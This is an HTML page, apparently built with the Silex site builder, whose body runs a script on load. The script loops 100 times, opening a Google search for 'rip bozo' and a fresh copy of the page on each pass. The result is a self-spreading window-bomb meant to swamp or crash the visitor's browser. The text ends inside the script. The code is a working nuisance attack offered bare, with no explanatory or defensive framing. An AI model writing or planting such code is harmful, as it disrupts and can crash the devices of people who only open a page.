

    window.silex = window.silex || {}
    window.silex.data = {"site":{"width":1200},"pages":[{"id":"page-page-1","displayName":"Page 1","link":{"linkType":"LinkTypePage","href":"#!page-page-1"},"canDelete":true,"canProperties":true,"canMove":true,"canRename":true,"opened":false}]}
<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>L</title>
    <style>
      body {
        background: black;
        color: white;
        font-family: monospace;
      }
    </style>
  </head>
  <body onload="javascript:lmfao()">
    <script>
      function lmfao() {
        var filename = window.location.pathname;
        for (let i=0; i<100; i++) {
          var onlineWindow = window.open("https://www.google.com/search?q=rip+bozo");
          var dupeWindow = window.open(filename, "", "1920px", "1080px");
        }
      }
    